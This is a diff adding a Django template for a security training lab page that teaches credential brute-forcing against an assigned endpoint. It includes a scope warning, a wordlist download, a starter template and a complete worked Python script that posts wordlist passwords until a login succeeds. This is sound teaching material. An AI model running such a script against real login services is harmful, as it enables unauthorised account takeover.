@@ -1,0 +1,153 @@
+{% extends "base_app.html" %}
+{% load static icons %}
+{% block title %}Instructions · Lab {{ lab.lab_token|slice:":8" }}{% endblock %}
+{% block page_title %}How this works{% endblock %}
+
+{% block topbar_actions %}
+  <a class="btn btn-outline" href="{% url 'labs:detail' lab.lab_token %}">{% icon "arrow-right" "icon" %} Back to lab</a>
+  <a class="btn btn-primary" href="{% url 'labs:monitor' lab.lab_token %}">{% icon "activity" "icon" %} Live monitor</a>
+{% endblock %}
+
+{% block content %}
+  <div class="grid grid-2">
+    <div class="card fade-in-up">
+      <div class="card-title">What is happening?</div>
+      <div class="flow">
+        <div class="flow-step">Python script</div>
+        <div class="flow-arrow">{% icon "arrow-down" "icon" %}</div>
+        <div class="flow-step">HTTP POST request</div>
+        <div class="flow-arrow">{% icon "arrow-down" "icon" %}</div>
+        <div class="flow-step">Django training server</div>
+        <div class="flow-arrow">{% icon "arrow-down" "icon" %}</div>
+        <div class="flow-step">Credential validation</div>
+        <div class="flow-arrow">{% icon "arrow-down" "icon" %}</div>
+        <div class="flow-step brand">Success or failure response</div>
+      </div>
+    </div>
+
+    <div class="card fade-in-up d-1">
+      <div class="card-title">Concepts you will use</div>
+      <ul class="check">
+        <li><strong>HTTP</strong> — the protocol your script speaks to the server.</li>
+        <li><strong>POST request</strong> — sends your guess to the server.</li>
+        <li><strong>JSON body</strong> — <code>{"username": …, "password": …}</code>.</li>
+        <li><strong>Response &amp; status codes</strong> — 200 success, 401 invalid, 429 limit.</li>
+        <li><strong>Authentication</strong> — the server checks the guess against the target.</li>
+        <li><strong>Loops</strong> — try each candidate password in turn.</li>
+        <li><strong>Reading a wordlist</strong> — iterate line by line.</li>
+        <li><strong>Stopping after success</strong> — <code>break</code> out of the loop.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="notice mt-2 fade-in-up">
+    <span class="notice-icon">{% icon "alert" "icon" %}</span>
+    <div>
+      <h3>Scope of this exercise</h3>
+      <p>This exercise may only be performed against your assigned training lab endpoint shown below. Do not point this technique at any other system.</p>
+    </div>
+  </div>
+
+  <h2 class="mt-3">Your exercise</h2>
+
+  <div class="card fade-in-up">
+    <div class="card-title">Training endpoint</div>
+    <div class="copy-field">
+      <code id="ex-url" data-copy>{{ request.scheme }}://{{ request.get_host }}{{ login_path }}</code>
+      <button type="button" data-copy-btn="ex-url">{% icon "copy" "icon" %} Copy</button>
+    </div>
+
+    <div class="grid grid-2 mt-1">
+      <div>
+        <label class="form-help" style="text-transform:uppercase; letter-spacing:.08em;">Username</label>
+        <div class="copy-field">
+          <code id="ex-username" data-copy>{{ lab.username }}</code>
+          <button type="button" data-copy-btn="ex-username">{% icon "copy" "icon" %} Copy</button>
+        </div>
+      </div>
+      <div>
+        <div class="spread" style="margin-bottom:8px;">
+          <label class="form-help mb-0" style="text-transform:uppercase; letter-spacing:.08em;">Wordlist · {{ wordlist.size }} passwords · {{ wordlist.get_difficulty_display }}</label>
+          <a class="btn btn-outline btn-sm" href="{% url 'labs:wordlist-download' lab.lab_token %}" download>{% icon "arrow-down" "icon" %} Download passwords.txt</a>
+        </div>
+        <div class="pill-list">
+          {% for pw in wordlist.passwords %}<span class="pill">{{ pw }}</span>{% endfor %}
+        </div>
+        <p class="form-help">Save this file next to your script as <code>passwords.txt</code>.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="grid grid-2 mt-2">
+    <div class="fade-in-up">
+      <div class="spread" style="margin-bottom:14px;">
+        <div class="card-title mb-0">Starter template — fill in the logic</div>
+        <button type="button" class="btn btn-ghost btn-sm" data-copy-btn="tpl-code">{% icon "copy" "icon" %} Copy</button>
+      </div>
+      <div class="terminal">
+        <div class="terminal-bar">
+          <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+          <span class="tt">brute_force.py</span>
+        </div>
+<pre id="tpl-code"><span class="c-key">import</span> requests
+
+<span class="c-comment"># Pre-filled for YOUR lab only.</span>
+LAB_URL  = <span class="c-str">"{{ request.scheme }}://{{ request.get_host }}{{ login_path }}"</span>
+USERNAME = <span class="c-str">"{{ lab.username }}"</span>
+
+<span class="c-comment"># Read candidate passwords from the file you downloaded</span>
+<span class="c-key">with</span> <span class="c-fn">open</span>(<span class="c-str">"passwords.txt"</span>) <span class="c-key">as</span> f:
+    <span class="c-key">for</span> line <span class="c-key">in</span> f:
+        password = line.strip()          <span class="c-comment"># remove the newline</span>
+        <span class="c-key">if</span> <span class="c-key">not</span> password:
+            <span class="c-key">continue</span>
+
+        <span class="c-comment"># TODO: send a POST request with USERNAME + password</span>
+
+        <span class="c-comment"># TODO: read response.json()["success"]</span>
+
+        <span class="c-comment"># TODO: print progress, and break when it is True</span>
+</pre>
+      </div>
+    </div>
+
+    <div class="fade-in-up d-1">
+      <div class="card-title">Worked example &amp; response shape</div>
+      <div class="terminal">
+        <div class="terminal-bar">
+          <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+          <span class="tt">solution.py</span>
+        </div>
+<pre><span class="c-key">import</span> requests
+
+LAB_URL  = <span class="c-str">"{{ request.scheme }}://{{ request.get_host }}{{ login_path }}"</span>
+USERNAME = <span class="c-str">"{{ lab.username }}"</span>
+
+<span class="c-key">with</span> <span class="c-fn">open</span>(<span class="c-str">"passwords.txt"</span>) <span class="c-key">as</span> f:
+    <span class="c-key">for</span> line <span class="c-key">in</span> f:
+        password = line.strip()
+        <span class="c-key">if</span> <span class="c-key">not</span> password:
+            <span class="c-key">continue</span>
+        r = requests.post(LAB_URL, json={
+            <span class="c-str">"username"</span>: USERNAME,
+            <span class="c-str">"password"</span>: password,
+        })
+        <span class="c-fn">print</span>(password, r.status_code)
+        <span class="c-key">if</span> r.json()[<span class="c-str">"success"</span>]:
+            <span class="c-fn">print</span>(<span class="c-str">"FOUND:"</span>, password)
+            <span class="c-key">break</span>
+</pre>
+      </div>
+      <div class="card mt-1">
+        <p class="subtle mt-0" style="font-size:.9rem;">Each request returns JSON and an HTTP status code:</p>
+<pre class="mono" style="font-size:.82rem; color:var(--text-dim); background:#05090e; border:1px solid var(--hairline); border-radius:9px; padding:14px; overflow-x:auto;">200  {"success": true,  "message": "Authentication successful", ...}
+401  {"success": false, "message": "Invalid credentials", "attempt_number": 4}</pre>
+        <p class="form-help mb-0">No platform login needed in the script — your lab token in the URL is the credential. Just save <code>passwords.txt</code> next to the script and run it.</p>
+      </div>
+    </div>
+  </div>
+{% endblock %}
+
+{% block scripts %}
+<script src="{% static 'js/copy.js' %}"></script>
+{% endblock %}
